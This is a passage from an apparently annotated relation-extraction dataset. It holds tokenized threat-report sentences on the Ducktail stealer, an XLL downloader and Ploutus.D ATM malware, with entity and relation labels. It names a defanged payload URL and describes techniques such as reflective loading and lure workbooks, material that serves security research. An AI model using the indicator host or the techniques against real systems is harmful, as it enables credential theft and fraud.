"IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."], ["The", "second", "stage", "of", "the", "Ducktail", "downloader", "is", "stored", "as", "AES", "encrypted", "Base32", "encoded", "blobThe", "Ducktail", "stealer", "payload", "is", "shared", "using", "large", "(", "over", "100", "MB", ")", "compressed", "archives", "containing", "a", "number", "of", "legitimate", "resources", "as", "well", "as", "malicious", "files", "."], ["The", "Base32", "encoded", "blob", "is", "decoded", "and", "loaded", "using", "reflectionThe", "file", "is", "created", "using", "Excel-DNA", "and", "contains", "a", "Base32", "encoded", "and", "encrypted", "data", "blob", "which", "gets", "loaded", "into", "the", "process", "space", "of", "Explorer", "using", "reflection", "."], ["Once", "decoded", ",", "the", "function", "Timer", "is", "called", ",", "which", "drops", "and", "opens", "a", "legitimate", "Excel", "workbook", "containing", "fake", "results", "of", "online", "advertising", "campaigns", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "FormBook", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "f", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [32, 32], "name": "AgentTesla", "pos": [32, 33], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [34, 34], "name": "Ransomware Stop", "pos": [34, 36], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [37, 37], "name": "Vidar", "pos": [37, 38], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [39, 39], "name": "Buer Loader", "pos": [39, 41], "index": "5_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [42, 42], "name": "Nanocore", "pos": [42, 43], "index": "6_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [44, 44], "name": "IceID", "pos": [44, 45], "index": "7_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [46, 46], "name": "Arkei", "pos": [46, 47], "index": "8_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [48, 48], "name": "AsyncRat", "pos": [48, 49], "index": "9_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [50, 50], "name": "BazarLoader", "pos": [50, 51], "index": "10_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "NET", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [56, 56], "name": "XLL file", "pos": [2, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "HASH", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [64, 64], "name": "payload", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [68, 68], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "Warzone", "pos": [10, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "HASH", "pos": [12, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [91, 91], "name": "AgentTesla", "pos": [19, 20], "index": "18_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [93, 93], "name": "Lokibot", "pos": [21, 22], "index": "19_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "Ducktail", "pos": [0, 1], "index": "20_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [99, 99], "name": "browser", "pos": [4, 5], "index": "21_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [113, 113], "name": "Facebook", "pos": [18, 19], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [138, 138], "name": "Ducktail downloader", "pos": [5, 7], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "blobThe", "pos": [14, 15], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [177, 177], "name": "blob", "pos": [3, 4], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [225, 225], "name": "Excel workbook", "pos": [15, 17], "index": "26_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 3, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 4, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 5, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 6, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 7, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 8, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 9, "h": 11}, {"r": "WR", "evidence": [0, 1], "t": 10, "h": 11}, {"r": "EX", "evidence": [1], "h": 11, "t": 12}, {"r": "WR", "evidence": [1], "h": 11, "t": 14}, {"r": "ST", "evidence": [1], "h": 11, "t": 15}, {"r": "RF", "evidence": [1], "h": 11, "t": 15}, {"r": "WR", "evidence": [1, 2], "h": 11, "t": 18}, {"r": "WR", "evidence": [1, 2], "h": 11, "t": 19}, {"r": "CO", "evidence": [1], "h": 12, "t": 13}, {"r": "CO", "evidence": [2], "h": 16, "t": 17}, {"r": "WR", "evidence": [2, 3], "t": 18, "h": 20}, {"r": "WR", "evidence": [2, 3], "t": 19, "h": 20}, {"r": "RD", "evidence": [3], "h": 20, "t": 21}, {"r": "RD", "evidence": [3], "h": 20, "t": 22}, {"r": "CO", "evidence": [3, 4, 5], "h": 20, "t": 23}, {"r": "WR", "evidence": [5], "h": 23, "t": 24}, {"r": "FR", "evidence": [5, 6], "h": 23, "t": 25}, {"r": "EX", "evidence": [5, 6], "t": 24, "h": 25}, {"r": "WR", "evidence": [6, 7], "h": 25, "t": 26}]}, {"title": "607-49", "sents": [["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."], ["The", "second", "stage", "of", "the", "Ducktail", "downloader", "is", "stored", "as", "AES", "encrypted", "Base32", "encoded", "blobThe", "Ducktail", "stealer", "payload", "is", "shared", "using", "large", "(", "over", "100", "MB", ")", "compressed", "archives", "containing", "a", "number", "of", "legitimate", "resources", "as", "well", "as", "malicious", "files", "."], ["The", "Base32", "encoded", "blob", "is", "decoded", "and", "loaded", "using", "reflectionThe", "file", "is", "created", "using", "Excel-DNA", "and", "contains", "a", "Base32", "encoded", "and", "encrypted", "data", "blob", "which", "gets", "loaded", "into", "the", "process", "space", "of", "Explorer", "using", "reflection", "."], ["Once", "decoded", ",", "the", "function", "Timer", "is", "called", ",", "which", "drops", "and", "opens", "a", "legitimate", "Excel", "workbook", "containing", "fake", "results", "of", "online", "advertising", "campaigns", "."], ["The", "endpoint", "then", "downloads", "and", "runs", "the", "Ducktail", "stealer", "payload", "from", "a", "publicly", "accessible", "Discord", "URL", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "NET", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "XLL file", "pos": [2, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "HASH", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "payload", "pos": [10, 11], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "Warzone", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "HASH", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "AgentTesla", "pos": [19, 20], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "Lokibot", "pos": [21, 22], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "Ducktail", "pos": [0, 1], "index": "9_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [45, 45], "name": "browser", "pos": [4, 5], "index": "10_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [59, 59], "name": "Facebook", "pos": [18, 19], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [84, 84], "name": "Ducktail downloader", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "blobThe", "pos": [14, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "blob", "pos": [3, 4], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [171, 171], "name": "Excel workbook", "pos": [15, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [182, 182], "name": "endpoint", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [188, 188], "name": "Ducktail stealer payload", "pos": [7, 10], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [195, 195], "name": "Discord URL", "pos": [14, 16], "index": "18_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "ST", "evidence": [0], "h": 0, "t": 4}, {"r": "RF", "evidence": [0], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 7}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 8}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 7, "h": 9}, {"r": "WR", "evidence": [1, 2], "t": 8, "h": 9}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2], "h": 9, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "EX", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}, {"r": "EX", "evidence": [7], "h": 16, "t": 17}, {"r": "ST", "evidence": [7], "h": 16, "t": 18}, {"r": "RF", "evidence": [7], "h": 16, "t": 18}]}, {"title": "607-50", "sents": [["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."], ["The", "second", "stage", "of", "the", "Ducktail", "downloader", "is", "stored", "as", "AES", "encrypted", "Base32", "encoded", "blobThe", "Ducktail", "stealer", "payload", "is", "shared", "using", "large", "(", "over", "100", "MB", ")", "compressed", "archives", "containing", "a", "number", "of", "legitimate", "resources", "as", "well", "as", "malicious", "files", "."], ["The", "Base32", "encoded", "blob", "is", "decoded", "and", "loaded", "using", "reflectionThe", "file", "is", "created", "using", "Excel-DNA", "and", "contains", "a", "Base32", "encoded", "and", "encrypted", "data", "blob", "which", "gets", "loaded", "into", "the", "process", "space", "of", "Explorer", "using", "reflection", "."], ["Once", "decoded", ",", "the", "function", "Timer", "is", "called", ",", "which", "drops", "and", "opens", "a", "legitimate", "Excel", "workbook", "containing", "fake", "results", "of", "online", "advertising", "campaigns", "."], ["The", "endpoint", "then", "downloads", "and", "runs", "the", "Ducktail", "stealer", "payload", "from", "a", "publicly", "accessible", "Discord", "URL", "."], ["The", "downloader", "drops", "a", "lure", "Excel", "workbook", "and", "downloads", "the", "Ducktail", "payload", "from", "DiscordSummaryAs", "a", "result", "of", "Microsoft", "'", "s", "decision", "to", "prevent", "execution", "of", "VBA", "macro", "code", "contained", "in", "documents", "downloaded", "from", "the", "Internet", ",", "we", "will", "likely", "see", "a", "gradual", "decline", "in", "the", "number", "of", "newly", "discovered", "malicious", "documents", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "Warzone", "pos": [10, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "HASH", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "AgentTesla", "pos": [19, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "Lokibot", "pos": [21, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "Ducktail", "pos": [0, 1], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [27, 27], "name": "browser", "pos": [4, 5], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [41, 41], "name": "Facebook", "pos": [18, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "Ducktail downloader", "pos": [5, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "blobThe", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "blob", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [153, 153], "name": "Excel workbook", "pos": [15, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "endpoint", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "Ducktail stealer payload", "pos": [7, 10], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [177, 177], "name": "Discord URL", "pos": [14, 16], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [181, 181], "name": "downloader", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [185, 185], "name": "Excel workbook", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "Ducktail payload", "pos": [10, 12], "index": "16_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "WR", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "FR", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "EX", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}, {"r": "ST", "evidence": [6], "h": 11, "t": 13}, {"r": "RF", "evidence": [6], "h": 11, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 14}, {"r": "WR", "evidence": [7], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 14, "t": 16}]}, {"title": "607-51", "sents": [["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."], ["The", "second", "stage", "of", "the", "Ducktail", "downloader", "is", "stored", "as", "AES", "encrypted", "Base32", "encoded", "blobThe", "Ducktail", "stealer", "payload", "is", "shared", "using", "large", "(", "over", "100", "MB", ")", "compressed", "archives", "containing", "a", "number", "of", "legitimate", "resources", "as", "well", "as", "malicious", "files", "."], ["The", "Base32", "encoded", "blob", "is", "decoded", "and", "loaded", "using", "reflectionThe", "file", "is", "created", "using", "Excel-DNA", "and", "contains", "a", "Base32", "encoded", "and", "encrypted", "data", "blob", "which", "gets", "loaded", "into", "the", "process", "space", "of", "Explorer", "using", "reflection", "."], ["Once", "decoded", ",", "the", "function", "Timer", "is", "called", ",", "which", "drops", "and", "opens", "a", "legitimate", "Excel", "workbook", "containing", "fake", "results", "of", "online", "advertising", "campaigns", "."], ["The", "endpoint", "then", "downloads", "and", "runs", "the", "Ducktail", "stealer", "payload", "from", "a", "publicly", "accessible", "Discord", "URL", "."], ["The", "downloader", "drops", "a", "lure", "Excel", "workbook", "and", "downloads", "the", "Ducktail", "payload", "from", "DiscordSummaryAs", "a", "result", "of", "Microsoft", "'", "s", "decision", "to", "prevent", "execution", "of", "VBA", "macro", "code", "contained", "in", "documents", "downloaded", "from", "the", "Internet", ",", "we", "will", "likely", "see", "a", "gradual", "decline", "in", "the", "number", "of", "newly", "discovered", "malicious", "documents", "."], ["Koobick-9980511-0Orbital", "QueriesCisco", "Secure", "Endpoint", "users", "can", "use", "Orbital", "Advanced", "Search", "to", "run", "complex", "OSqueries", "to", "see", "if", "their", "endpoints", "are", "infected", "with", "this", "specific", "threat", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Ducktail", "pos": [0, 1], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [4, 4], "name": "browser", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [18, 18], "name": "Facebook", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "Ducktail downloader", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "blobThe", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [82, 82], "name": "blob", "pos": [3, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "Excel workbook", "pos": [15, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "endpoint", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "Ducktail stealer payload", "pos": [7, 10], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [154, 154], "name": "Discord URL", "pos": [14, 16], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [158, 158], "name": "downloader", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "Excel workbook", "pos": [5, 7], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "Ducktail payload", "pos": [10, 12], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "EX", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "EX", "evidence": [5], "h": 7, "t": 8}, {"r": "ST", "evidence": [5], "h": 7, "t": 9}, {"r": "RF", "evidence": [5], "h": 7, "t": 9}, {"r": "CO", "evidence": [5, 6], "h": 7, "t": 10}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "h": 10, "t": 12}]}, {"title": "651-0", "sents": [["Typically", ",", "it", "happens", "by", "supplying", "a", "special", "authorisation", "code", "or", "card", "created", "to", "authorise", "the", "transaction", "."], ["Before", "that", ",", "criminals", "had", "to", "infect", "the", "targeted", "ATM", "to", "install", "the", "code", ",", "which", "more", "often", "than", "not", "meant", "that", "they", "had", "to", "physically", "open", "the", "device", "to", "access", "its", "optical", "media", "reading", "devices", "or", "USB", "ports", "."], ["The", "first", "one", "requires", "the", "attacker", "to", "physically", "access", "the", "device", "."], ["The", "second", "group", "assumes", "that", "the", "attacker", "installs", "malware", "indirectly", ",", "typically", "by", "compromising", "the", "internal", "network", "of", "the", "bank", "and", "then", "targeting", "ATMs", "using", "stolen", "credentials", "."], ["Most", "ATM", "samples", "require", "physical", "access", "to", "the", "targeted", "ATM", "."], ["The", "attackers", "need", "to", "be", "able", "to", "access", "physical", "ports", "or", "a", "CD-ROM", "drive", "to", "be", "able", "to", "boot", "from", "it", "and", "modify", "the", "ATM", "system", "image", "to", "install", "the", "malware", "."], ["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "criminals", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [27, 27], "name": "ATM", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "code", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "attacker", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "attacker", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "malware", "pos": [8, 9], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [93, 93], "name": "ATMs", "pos": [23, 24], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [96, 96], "name": "credentials", "pos": [26, 27], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [99, 99], "name": "ATM", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [110, 110], "name": "attackers", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [118, 118], "name": "ports", "pos": [9, 10], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [133, 133], "name": "ATM", "pos": [24, 25], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [139, 139], "name": "malware", "pos": [30, 31], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "Ploutus.D", "pos": [0, 1], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [145, 145], "name": "ATM", "pos": [4, 5], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [159, 159], "name": "ATMs", "pos": [18, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "malware", "pos": [13, 14], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "t": 5, "h": 6}, {"r": "EX", "evidence": [3], "t": 5, "h": 6}, {"r": "RD", "evidence": [3], "h": 4, "t": 7}, {"r": "FR", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "RD", "evidence": [3, 4], "t": 5, "h": 8}, {"r": "EX", "evidence": [3, 4], "t": 5, "h": 8}, {"r": "ST", "evidence": [5], "h": 9, "t": 10}, {"r": "RF", "evidence": [5], "h": 9, "t": 10}, {"r": "FR", "evidence": [5], "h": 9, "t": 11}, {"r": "WR", "evidence": [5], "h": 9, "t": 12}, {"r": "RD", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "EX", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "WR", "evidence": [6], "t": 13, "h": 14}, {"r": "WR", "evidence": [6], "t": 13, "h": 14}, {"r": "WR", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "WR", "evidence": [6], "t": 13, "h": 15}, {"r": "WR", "evidence": [6, 7], "h": 15, "t": 16}, {"r": "WR", "evidence": [6, 7], "h": 15, "t": 16}]}, {"title": "651-1", "sents": [["Before", "that", ",", "criminals", "had", "to", "infect", "the", "targeted", "ATM", "to", "install", "the", "code", ",", "which", "more", "often", "than", "not", "meant", "that", "they", "had", "to", "physically", "open", "the", "device", "to", "access", "its", "optical", "media", "reading", "devices", "or", "USB", "ports", "."], ["The", "first", "one", "requires", "the", "attacker", "to", "physically", "access", "the", "device", "."], ["The", "second", "group", "assumes", "that", "the", "attacker", "installs", "malware", "indirectly", ",", "typically", "by", "compromising", "the", "internal", "network", "of", "the", "bank", "and", "then", "targeting", "ATMs", "using", "stolen", "credentials", "."], ["Most", "ATM", "samples", "require", "physical", "access", "to", "the", "targeted", "ATM", "."], ["The", "attackers", "need", "to", "be", "able", "to", "access", "physical", "ports", "or", "a", "CD-ROM", "drive", "to", "be", "able", "to", "boot", "from", "it", "and", "modify", "the", "ATM", "system", "image", "to", "install", "the", "malware", "."], ["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "criminals", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "ATM", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "code", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "attacker", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "attacker", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "malware", "pos": [8, 9], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [75, 75], "name": "ATMs", "pos": [23, 24], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [78, 78], "name": "credentials", "pos": [26, 27], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [81, 81], "name": "ATM", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [92, 92], "name": "attackers", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [100, 100], "name": "ports", "pos": [9, 10], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [115, 115], "name": "ATM", "pos": [24, 25], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "malware", "pos": [30, 31], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [123, 123], "name": "Ploutus.D", "pos": [0, 1], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [127, 127], "name": "ATM", "pos": [4, 5], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [141, 141], "name": "ATMs", "pos": [18, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [166, 166], "name": "malware", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [188, 188], "name": "attackers", "pos": [1, 2], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [210, 210], "name": "ports", "pos": [23, 24], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 